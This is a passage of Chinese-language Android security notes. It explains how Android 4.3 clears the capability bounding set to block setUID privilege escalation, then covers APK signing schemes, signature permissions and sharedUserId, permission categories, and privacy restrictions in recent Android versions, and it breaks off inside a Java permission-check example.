id=\"Jelly-Bean-MR2（Android-4-3）的补丁（setUID-提权收紧）\"><a href=\"#Jelly-Bean-MR2（Android-4-3）的补丁（setUID-提权收紧）\" class=\"headerlink\" title=\"Jelly Bean MR2（Android 4.3）的补丁（setUID 提权收紧）\"></a>Jelly Bean MR2（Android 4.3）的补丁（setUID 提权收紧）</h2><ul>\n<li>在 Android 4.3 之前，APK 进程能通过 <code>Runtime.exec()</code> 执行 <strong>root-setUID</strong> 二进制并提升 EUID。</li>\n<li>4.3 起，Zygote 在 fork 应用进程时<strong>清空 Capability Bound Set</strong>，使后续执行 setUID 文件时即使 EUID 改变，也<strong>无实际 capability</strong>可用。</li>\n<li>关键逻辑位于 Zygote 分支（Dalvik/ART 不同版本位置不同），等价于：<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 伪代码：清空 PR_CAPBSET（capability bound set）</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; prctl(PR_CAPBSET_READ, i, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>) &gt;= <span class=\"number\">0</span>; i++) &#123;</span><br><span class=\"line\">    prctl(PR_CAPBSET_DROP, i, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></li>\n<li>结论：普通 APK 进程执行 root-setUID 二进制不再具备有效的 capability，无法借此获取特权。</li>\n</ul>\n<h3 id=\"JB-MR2-细节（扩展版）\"><a href=\"#JB-MR2-细节（扩展版）\" class=\"headerlink\" title=\"JB MR2 细节（扩展版）\"></a>JB MR2 细节（扩展版）</h3><p><strong>动机</strong><br>早期（4.2 及之前）APK 进程可通过 <code>Runtime.exec()</code>/<code>fork+exec</code> 执行带 <strong>setUID-root</strong> 位的二进制，从而把子进程的 <strong>EUID 提升为 0</strong>，再借助传统 root 权限做特权操作。为阻断这一途径，Android 4.3 在 Zygote 派生应用进程后，对 <strong>Capability Bound Set（BSET）</strong> 进行清空，使随后即便执行 setUID 文件，进程也<strong>拿不到任何有效的 capability</strong>。</p>\n<p><strong>内核前提</strong>  </p>\n<ul>\n<li>依赖 Linux 的 <strong>Capability Bounding Set</strong> 机制（<code>prctl(PR_CAPBSET_DROP, cap)</code>）。  </li>\n<li>当某 capability 被从 BSET 中 drop 后，后续<strong>不可再添加</strong>到该进程的 Permitted 集（除非通过 exec 进入 <code>init</code>/更高权限环境，但普通 APK 不具备）。</li>\n</ul>\n<p><strong>Zygote 侧变化（伪代码）</strong>  </p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 在 fork 普通应用进程后（进入 app uid/gid 环境前后），遍历所有 capability：</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"type\">int</span> cap = <span class=\"number\">0</span>; prctl(PR_CAPBSET_READ, cap, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>) &gt;= <span class=\"number\">0</span>; ++cap) &#123;</span><br><span class=\"line\">    prctl(PR_CAPBSET_DROP, cap, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);  <span class=\"comment\">// 将 BSET 清空</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 随后再 setresgid / setresuid 至应用 uid/gid，清空附属组等。</span></span><br><span class=\"line\"><span class=\"comment\">// 注意：JB MR2 当时并**未**依赖 PR_SET_NO_NEW_PRIVS（较新内核才有），主要手段就是清空 BSET。</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>能力传播公式回顾</strong><br>对一次 <code>execve(file)</code>，新的进程 capability 计算（简化）为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">P&#x27; = (P_inh &amp; F_inh) | (F_perm &amp; BSET)</span><br><span class=\"line\">E&#x27; = F_eff ? P&#x27; : 0</span><br><span class=\"line\">I&#x27; = P_inh   // 仅 Inheritable 可直接继承</span><br></pre></td></tr></table></figure>\n<ul>\n<li>其中 <code>F_*</code> 来自<strong>目标可执行文件</strong>的 capability，<code>P_*</code> 为<strong>当前进程</strong>；<code>BSET</code> 为 <strong>Capability Bound Set</strong>。</li>\n<li>当 <strong>BSET = 0</strong> 时，无论 <code>F_perm</code> 多大、<code>F_eff</code> 是否置位，<code>P&#39;</code> 都只能来源于 <code>P_inh &amp; F_inh</code>。而普通 APK 的 <code>P_inh</code> 默认为 0，故 <code>P&#39; = 0</code>，<code>E&#39; = 0</code>。</li>\n</ul>\n<p><strong>对 setUID-root 的具体影响</strong>  </p>\n<ul>\n<li>setUID 仍会令子进程的<strong>EUID 变为 0</strong>（身份层面），但由于 <code>P&#39;=0</code>、<code>E&#39;=0</code>，进程<strong>没有任何有效 capability</strong>，无法执行需要 capability 的特权操作（例如 <code>CAP_SYS_ADMIN</code>、<code>CAP_SYS_MODULE</code> 等）。</li>\n<li>这等价于：<strong>“看起来像 root，实则无权”</strong>，从根本上堵住了通过 setUID 提权的常见路径。</li>\n</ul>\n<p><strong>前/后对比（示例）</strong>  </p>\n<ul>\n<li><em>JB MR2 之前（BSET=全 1）</em>：<ul>\n<li><code>F_eff=1</code>、<code>F_perm</code> 含若干能力 → <code>P&#39;</code> 至少获得 <code>F_perm &amp; BSET</code>，再赋给 <code>E&#39;</code>，子进程具备相应特权。</li>\n</ul>\n</li>\n<li><em>JB MR2 之后（BSET=0）</em>：<ul>\n<li>即便 <code>F_eff=1</code>，也因 <code>F_perm &amp; 0 = 0</code> → <code>P&#39;=0</code>、<code>E&#39;=0</code>。</li>\n</ul>\n</li>\n</ul>\n<p><strong>如何验证</strong>  </p>\n<ol>\n<li>在 APK 内部 <code>exec</code> 一个 setUID-root 的小程序：<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id; cat /proc/$$/status | egrep &#x27;Uid:|Gid:|Cap(Inh|Prm|Eff)&#x27;</span><br></pre></td></tr></table></figure>\n可见 <code>Uid:</code> 的 <code>EUID</code> 为 0，但 <code>CapEff:</code> 为全 0。  </li>\n<li>改为在 <code>adb shell</code>（root 环境）直接运行同一程序（不经 Zygote app 沙盒）对比其 <code>CapEff</code>，能观察到差异。</li>\n</ol>\n<p><strong>补充说明</strong>  </p>\n<ul>\n<li>这一设计与后续版本中的 <strong>SELinux（Enforcing）</strong>、<strong>权限拆分/前台服务限制</strong> 等共同组成多层防护。  </li>\n<li>后续 Android/内核版本也引入了 <code>no_new_privs</code> 等手段，但 <strong>JB MR2 的关键变化点就是清空 BSET</strong>。</li>\n</ul>\n<p>捕鱼篇</p>\n<h1 id=\"签名和权限\"><a href=\"#签名和权限\" class=\"headerlink\" title=\"签名和权限\"></a>签名和权限</h1><h2 id=\"移动平台中的主流签名作用：自签名的完整性鉴别\"><a href=\"#移动平台中的主流签名作用：自签名的完整性鉴别\" class=\"headerlink\" title=\"移动平台中的主流签名作用：自签名的完整性鉴别\"></a>移动平台中的主流签名作用：自签名的完整性鉴别</h2><ul>\n<li>什么是自签名<br>证书是用来证明公钥拥有者的身份信息，一般由可信的第三方机构颁发，三方机构用自己的私钥签名拥有者的公钥，从而证明该证书的有效性<br>证书的签名一般是由证书的颁发者的私钥签名<br>自签名指证书的签名者（机构）和证书拥有者（个体）是同一个实体<br>自签名即我自己的私钥签名我自己的公钥</li>\n<li>自签名的作用1：作为信任链的根证书<br>比如一个银行的公钥证书，由银行自己签名，银行自己颁发给自己，访问网上银行服务时，需要吧银行的根证书加入到系统中，从而信任该证书</li>\n<li>自签名的作用2：完整性鉴别 </li>\n</ul>\n<h2 id=\"移动平台中的主流签名作用：信任模式\"><a href=\"#移动平台中的主流签名作用：信任模式\" class=\"headerlink\" title=\"移动平台中的主流签名作用：信任模式\"></a>移动平台中的主流签名作用：信任模式</h2><ul>\n<li><p>何为可信任？<br>我写的应用？<br>我信任的哥们写的应用？</p>\n</li>\n<li><p>如何鉴别可信任<br>签名了？<br>签名是可信的？（证书、证书回溯）</p>\n</li>\n<li><p>可信任和普通应用的权利差异<br>人为的把一些Operation归类<br>某类Operation对于可信任应用和普通应用的表现不一样</p>\n</li>\n<li><p>一些例子<br>系统应用使用系统特权不需要用户弹窗授权</p>\n<h2 id=\"移动平台中的主流签名作用：限制安装-运行\"><a href=\"#移动平台中的主流签名作用：限制安装-运行\" class=\"headerlink\" title=\"移动平台中的主流签名作用：限制安装/运行\"></a>移动平台中的主流签名作用：限制安装/运行</h2></li>\n<li><p>应用安装时<br>是否包含签名？—-》没有？禁止安装<br>提取证书进行验证—-》证书是有效且可信的？—-》不是？禁止安装<br>基于证书的公钥对签名进行验证—-》签名验证通过？—-》不是？禁止安装</p>\n</li>\n<li><p>应用运行某些特殊代码（特权）时<br>是否包含签名？—-》没有？禁止运行<br>提取证书进行验证—-》证书是有效且可信的？—-》不是？禁止运行<br>基于证书的公钥对签名进行验证—-》签名验证通过？—-》不是？禁止运行</p>\n<h2 id=\"权限的作用：细粒度的特权管理\"><a href=\"#权限的作用：细粒度的特权管理\" class=\"headerlink\" title=\"权限的作用：细粒度的特权管理\"></a>权限的作用：细粒度的特权管理</h2></li>\n<li><p>权限是一个ID或者一个字符串</p>\n</li>\n<li><p>权限用来细分权利（类似Capability）</p>\n</li>\n<li><p>通常一个权限与一类操作绑定</p>\n</li>\n<li><p>权限首先需要申请</p>\n</li>\n<li><p>但是申请后是否被批准由平台策略决定</p>\n</li>\n<li><p>例子1：应用读写SDCARD</p>\n</li>\n<li><p>例子2：应用reset手机</p>\n<h2 id=\"权限的安全性保护：通过签名\"><a href=\"#权限的安全性保护：通过签名\" class=\"headerlink\" title=\"权限的安全性保护：通过签名\"></a>权限的安全性保护：通过签名</h2></li>\n<li><p>权限的完整性保护：防篡改<br>例子（通过认证并获得签名后再加policy权限）<br>实现方式：签名对（code+权限）完整性保护 ，如果权限被篡改，签名校验失败，拒绝执行</p>\n</li>\n<li><p>权限的授权安全策略：防Escalate<br>例子（普通应用申请Inject Event权限）<br>实现方式，即使用户申请了，也不能获得，因为签名不是系统的签名，所以不授予权限</p>\n</li>\n</ul>\n<h2 id=\"回顾和总结\"><a href=\"#回顾和总结\" class=\"headerlink\" title=\"回顾和总结\"></a>回顾和总结</h2><h1 id=\"Android中的签名\"><a href=\"#Android中的签名\" class=\"headerlink\" title=\"Android中的签名\"></a>Android中的签名</h1><h2 id=\"Android的签名作用：完整性鉴别\"><a href=\"#Android的签名作用：完整性鉴别\" class=\"headerlink\" title=\"Android的签名作用：完整性鉴别\"></a>Android的签名作用：完整性鉴别</h2><ul>\n<li>支持自签名用于完整行鉴别</li>\n<li>不做信任模式</li>\n<li>不做安装和运行时的限制,即不限制证书是否是可信的<h2 id=\"Android的签名作用：Signature-Permissions-和-ShareUID\"><a href=\"#Android的签名作用：Signature-Permissions-和-ShareUID\" class=\"headerlink\" title=\"Android的签名作用：Signature Permissions 和 ShareUID\"></a>Android的签名作用：Signature Permissions 和 ShareUID</h2></li>\n<li>Signature Protected Level Permissions<br>用于特权Permission<br>只有特定签名的APK才被授权<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"comment\">&lt;!-- @SystemApi Allows access to hardware peripherals.  Intended only for hardware testing.</span></span><br><span class=\"line\"><span class=\"comment\">     &lt;p&gt;Not for use by third-party applications.</span></span><br><span class=\"line\"><span class=\"comment\">     @hide</span></span><br><span class=\"line\"><span class=\"comment\">--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">permission</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.permission.HARDWARE_TEST&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:protectionLevel</span>=<span class=\"string\">&quot;signature&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure></li>\n<li>Share Process UID android:sharedUserId=”xxxx”<br>Process间Share UID的目的是共享资源等<br>Android中两个APK Share相同的UID必须其签名所用的Private Key一样（为什么）<br>如果shareUID相同，A可以访问B中的data/data下的资源<br>android11 shareUID不再支持，因为它破坏了应用沙盒的安全模型，使得应用间的隔离变得复杂。<h2 id=\"Android的签名作用：身份ID和升级的匹配\"><a href=\"#Android的签名作用：身份ID和升级的匹配\" class=\"headerlink\" title=\"Android的签名作用：身份ID和升级的匹配\"></a>Android的签名作用：身份ID和升级的匹配</h2></li>\n<li>Android中的自签名只是代表了身份，但不代表身份是否可信任</li>\n<li>Android的应用的Identifier是Package Name:<br>Package Name 不一样，互相不影响，允许同时存在（安装）<br>Package Name 一样，只能存在一个，允许做升级处理</li>\n<li>升级的安全性考虑<br>必须签名的证书一致（防假冒，防侵入隐私）<br>如果不一致，则用户要么放弃新的应用，要么先卸载旧的，再安装新的。但这属于安装，不属于升级<br>正常的升级不擦除应用的工作目录数据，以保证历史数据的持续性<h2 id=\"AndroidAPK之META-INF\"><a href=\"#AndroidAPK之META-INF\" class=\"headerlink\" title=\"AndroidAPK之META INF\"></a>AndroidAPK之META INF</h2></li>\n<li>APK结构</li>\n<li>META INF的组成</li>\n<li>•    Android 7.0 (Nougat) 开始支持 v2 签名（APK Signature Scheme v2），之后又有 v3/v4。<br>  •    使用 v2/v3/v4 签名时，可以不再包含 CERT.RSA、CERT.SF、MANIFEST.MF 文件，因为签名数据存储在 APK 尾部的 Signing Block 里。</li>\n<li><em>APK Signature Scheme 现状（2025）</em>*</li>\n<li><strong>v1（JAR 签名）</strong>：只保护单个条目；Android 7.0+ 仍支持但已不推荐，易被 zipalign 等修改破坏。</li>\n<li><strong>v2</strong>：签名数据位于 APK <strong>Signing Block</strong>；显著加速安装校验，允许不再包含 <code>CERT.RSA/ CERT.SF/ MANIFEST.MF</code>。</li>\n<li><strong>v3</strong>：在 v2 基础上支持<strong>密钥轮换（Proof-of-rotation）</strong>；升级时可更换签名密钥并建立信任链。</li>\n<li><strong>v4</strong>：为<strong>增量安装/分发</strong>设计，搭配 v2/v3 使用，主要由安装器消费。</li>\n<li>校验命令：<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apksigner verify -v --print-certs your.apk</span><br></pre></td></tr></table></figure></li>\n<li>Play 商店上架要求：应使用 v2+（新应用一般要求 v3），仅 v1 可能被拒。</li>\n<li>签名流程<br>PrivateKey(hash(CERT.SF)) =&gt; CERT.RSA<h2 id=\"回顾和总结-1\"><a href=\"#回顾和总结-1\" class=\"headerlink\" title=\"回顾和总结\"></a>回顾和总结</h2></li>\n</ul>\n<h1 id=\"Android中的权限\"><a href=\"#Android中的权限\" class=\"headerlink\" title=\"Android中的权限\"></a>Android中的权限</h1><h2 id=\"近年权限与隐私重大变化（Android-10-15-摘要）\"><a href=\"#近年权限与隐私重大变化（Android-10-15-摘要）\" class=\"headerlink\" title=\"近年权限与隐私重大变化（Android 10~15 摘要）\"></a>近年权限与隐私重大变化（Android 10~15 摘要）</h2><ol>\n<li><strong>分区存储 Scoped Storage</strong>（Android 10/11）</li>\n</ol>\n<ul>\n<li>外部存储访问被沙箱化；<code>READ/WRITE_EXTERNAL_STORAGE</code> 逐步被弱化。</li>\n<li>Android 11 起提供 <strong>MANAGE_EXTERNAL_STORAGE</strong>（极度敏感，仅少量场景允许）。</li>\n<li>媒体访问细分为：<code>READ_MEDIA_IMAGES</code> / <code>READ_MEDIA_VIDEO</code> / <code>READ_MEDIA_AUDIO</code>（Android 13+），以及 <strong>选择性访问</strong> <code>READ_MEDIA_VISUAL_USER_SELECTED</code>（Android 14/15）。</li>\n</ul>\n<ol start=\"2\">\n<li><strong>包可见性（Package Visibility）</strong>（Android 11）</li>\n</ol>\n<ul>\n<li>默认<strong>无法枚举</strong>系统上安装的其他包。</li>\n<li>需要在 <code>AndroidManifest.xml</code> 中声明：<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">queries</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">package</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;com.example.target&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">intent</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">action</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.intent.action.VIEW&quot;</span> /&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">data</span> <span class=\"attr\">android:scheme</span>=<span class=\"string\">&quot;https&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">intent</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">queries</span>&gt;</span></span><br></pre></td></tr></table></figure></li>\n</ul>\n<ol start=\"3\">\n<li><strong>运行时权限拆分与新增</strong></li>\n</ol>\n<ul>\n<li>Android 12：蓝牙权限改为运行时 <code>BLUETOOTH_CONNECT/SCAN/ADVERTISE</code>，并引入 <strong>NEARBY_DEVICES</strong> 场景限制。</li>\n<li>Android 12：位置支持<strong>近似/精确</strong>；用户可仅授予近似位置。</li>\n<li>Android 13：<strong>通知权限</strong> <code>POST_NOTIFICATIONS</code> 改为运行时授权。</li>\n<li>Android 14/15：健康/传感器、后台权限进一步收紧（例如 <code>BODY_SENSORS_BACKGROUND</code> 需额外审查）。</li>\n</ul>\n<ol start=\"4\">\n<li><strong>前台服务（FGS）与后台限制</strong></li>\n</ol>\n<ul>\n<li>Android 12 起要求声明 <strong>前台服务类型</strong>（<code>type=&quot;location|mediaPlayback|connectedDevice|dataSync|camera|microphone|health&quot;</code> 等）。</li>\n<li>Android 14/15 对<strong>后台启动 FGS</strong>、超时与并发数量更严格；建议改用 <strong>WorkManager + 明确的 FGS 类型</strong>。</li>\n</ul>\n<ol start=\"5\">\n<li><strong>精确闹钟</strong></li>\n</ol>\n<ul>\n<li>Android 13 引入 <code>USE_EXACT_ALARM</code>；Android 14/15 对非闹钟类 App 更<strong>严格限制</strong>，需合规理由与设置跳转。</li>\n</ul>\n<ol start=\"6\">\n<li><strong>照片选择器（Photo Picker）</strong>（Android 13+）</li>\n</ol>\n<ul>\n<li>无需存储权限即可让用户选择媒体；优先使用系统 Photo Picker 替代自建文件选择。</li>\n</ul>\n<ol start=\"7\">\n<li><strong>PendingIntent 可变性</strong></li>\n</ol>\n<ul>\n<li>Android 12 要求显式设置 <code>FLAG_IMMUTABLE</code> 或 <code>FLAG_MUTABLE</code>，默认不再安全。</li>\n</ul>\n<ol start=\"8\">\n<li><strong>签名权限与 privapp 权限</strong></li>\n</ol>\n<ul>\n<li>大量历史 <code>signatureOrSystem</code> 权限被收紧为 <code>signature</code>；OEM 侧须通过 <code>privapp-permissions</code> 白名单并配套签名。<h2 id=\"Android的权限作用：细粒度特权管理\"><a href=\"#Android的权限作用：细粒度特权管理\" class=\"headerlink\" title=\"Android的权限作用：细粒度特权管理\"></a>Android的权限作用：细粒度特权管理</h2></li>\n<li>权限与操作关联<br>android不支持隐式申请权限，即使是系统应用，也需要显式申请权限</li>\n<li>应用需要显式申请权限</li>\n<li>用户对权限可知（不可控），<br>现在可控（厂商处理）</li>\n<li>对特权权限单独控制<h2 id=\"Android的不同权限类别\"><a href=\"#Android的不同权限类别\" class=\"headerlink\" title=\"Android的不同权限类别\"></a>Android的不同权限类别</h2>在 Android 中，<strong>权限（Permission）</strong>按作用范围和敏感程度可以分为几个主要类别。下面给为一个体系化梳理：<br>⸻</li>\n</ul>\n<ol>\n<li>普通权限 (Normal Permissions)<br> •    特点：涉及用户隐私风险较小，系统会在安装时自动授予。<br> •    示例：<br> •    INTERNET：访问网络<br> •    ACCESS_NETWORK_STATE：获取网络状态<br> •    SET_WALLPAPER：设置壁纸<br>⸻</li>\n<li>危险权限 (Dangerous Permissions)<br> •    特点：涉及用户隐私或设备安全，必须 运行时动态申请（Android 6.0+）。<br> •    按权限组分类（常见组）：<br> •    日历 (CALENDAR)<br> •    READ_CALENDAR、WRITE_CALENDAR<br> •    相机 (CAMERA)<br> •    CAMERA<br> •    联系人 (CONTACTS)<br> •    READ_CONTACTS、WRITE_CONTACTS、GET_ACCOUNTS<br> •    位置 (LOCATION)<br> •    ACCESS_FINE_LOCATION、ACCESS_COARSE_LOCATION<br> •    麦克风 (MICROPHONE)<br> •    RECORD_AUDIO<br> •    电话 (PHONE)<br> •    READ_PHONE_STATE、CALL_PHONE、READ_CALL_LOG、WRITE_CALL_LOG、ADD_VOICEMAIL、USE_SIP、PROCESS_OUTGOING_CALLS<br> •    传感器 (SENSORS)<br> •    BODY_SENSORS<br> •    短信 (SMS)<br> •    SEND_SMS、RECEIVE_SMS、READ_SMS、RECEIVE_WAP_PUSH、RECEIVE_MMS<br> •    存储 (STORAGE)<br> •    READ_EXTERNAL_STORAGE、WRITE_EXTERNAL_STORAGE<br>⸻</li>\n<li>签名权限 (Signature Permissions)<br> •    特点：只有当 请求权限的应用 和 声明权限的应用 使用相同的签名证书时，才能授予。<br> •    应用场景：系统应用间的私有接口调用。<br> •    示例：<br> •    INSTALL_PACKAGES（安装 APK）<br> •    DELETE_PACKAGES（卸载 APK）<br>⸻</li>\n<li>签名或系统权限 (SignatureOrSystem Permissions)<br> •    特点：Android 5.0 以前允许系统预装应用（放在 /system/app）或相同签名应用使用。<br> •    状态：Android 6.0 开始逐渐废弃，很多权限被收紧为 Signature-only。<br> •    示例（老系统才有效）：<br> •    WRITE_SETTINGS<br> •    CHANGE_CONFIGURATION<br>⸻</li>\n<li>特殊权限 (Special Permissions)<br>这些不属于普通危险权限，需要通过 特殊 API 或系统设置界面 授权。<br> •    SYSTEM_ALERT_WINDOW（悬浮窗权限）<br> •    通过 Settings.canDrawOverlays() 检查<br> •    WRITE_SETTINGS（修改系统设置）<br> •    通过 Settings.System.canWrite() 检查<br> •    REQUEST_INSTALL_PACKAGES（允许安装未知来源的 APK）<br> •    Android 8.0 引入<br> •    MANAGE_EXTERNAL_STORAGE（管理所有文件）<br> •    Android 11 引入，替代传统的存储权限<br> •    USE_FULL_SCREEN_INTENT（高优先级通知）<br> •    Android 10 引入<br>⸻</li>\n<li>受限制权限 (Restricted Permissions, Android 10+)<br> •    特点：Google 逐步收紧一些权限的使用，需要 Google 审核/声明特殊用途 才能上架 Play。<br> •    示例：<br> •    READ_SMS、SEND_SMS（敏感通讯权限）<br> •    READ_CALL_LOG、WRITE_CALL_LOG<br> •    ACCESS_BACKGROUND_LOCATION（后台定位权限，Android 10+ 严格限制）<br>⸻<br>✅ 总结：Android 权限主要分为：<br> •    普通权限（自动授予）<br> •    危险权限（需要运行时授权）<br> •    签名/签名或系统权限（系统或签名一致才可用）<br> •    特殊权限（需要通过系统设置授权）<br> •    受限制权限（Google 审核，敏感程度高）<h2 id=\"Android的平台权限定义\"><a href=\"#Android的平台权限定义\" class=\"headerlink\" title=\"Android的平台权限定义\"></a>Android的平台权限定义</h2>定义在AndroidManifest.xml中<br>Android 的权限本质上就是字符串常量，统一定义在 frameworks/base/core/res/AndroidManifest.xml 里。<br>这是系统框架的清单文件，其中包含了所有系统预定义权限，例如：<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">permission</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.permission.READ_EXTERNAL_STORAGE&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:protectionLevel</span>=<span class=\"string\">&quot;dangerous&quot;</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">permission</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:protectionLevel</span>=<span class=\"string\">&quot;dangerous&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n当在Application中 AndroidManifest.xml 里写：<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">uses-permission</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>\n就使用了这个权限，但是必须动态申请。</li>\n</ol>\n<blockquote>\n<p>提示：从 Android 13 起，媒体读取权限按类型细分；从 Android 11 起，**<code>WRITE_EXTERNAL_STORAGE</code> 基本被废弃**，请改用 <code>MediaStore</code> + 具体媒体权限或 Photo Picker。</p>\n</blockquote>\n<h2 id=\"Android的运行时权限控制方式：通过PM的CheckPermission\"><a href=\"#Android的运行时权限控制方式：通过PM的CheckPermission\" class=\"headerlink\" title=\"Android的运行时权限控制方式：通过PM的CheckPermission\"></a>Android的运行时权限控制方式：通过PM的CheckPermission</h2><ul>\n<li>Android独有的Service（底层平台不具有）</li>\n<li>所以需要在Android本身Framework中控制</li>\n<li>主流的Service一般都是基于Binder IPC或者其他IPC提供服务</li>\n<li>所以在最低层控制（Service所在的service可执行文件 run中）以避免逃逸控制<br>绕开Utility Function直接invoke Remote Service<br>所以要在service run中进行控制</li>\n<li>例子 DayDream<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">void</span> <span class=\"title function_\">startDockOrHome</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  awakenDreams();</span><br><span class=\"line\">  <span class=\"type\">Intent</span> <span class=\"variable\">dock</span> <span class=\"operator\">=</span> createDockIntent();</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(dock != <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">      mContext.startActivityAsUser(dock,UserHandle.CURRENT);</span><br><span class=\"line\">      <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">catch</span>(ActivityNotFoundException e)&#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">awakenDreams</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">      <span class=\"type\">IDreamManager</span> <span class=\"variable\">dreamManager</span> <span class=\"operator\">=</span> getDreamManager();</span><br><span class=\"line\">      <span class=\"keyword\">if</span>(dreamManager != <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">          dreamManager.awaken();</span><br><span class=\"line\">        &#125;<span class=\"keyword\">catch</span>(RemoteException e)&#123;</span><br><span class=\"line\">          <span class=\"comment\">//fine,stay asleep then</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;    </span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">static</span> IDreamManager <span class=\"title function_\">getDreamManager</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> 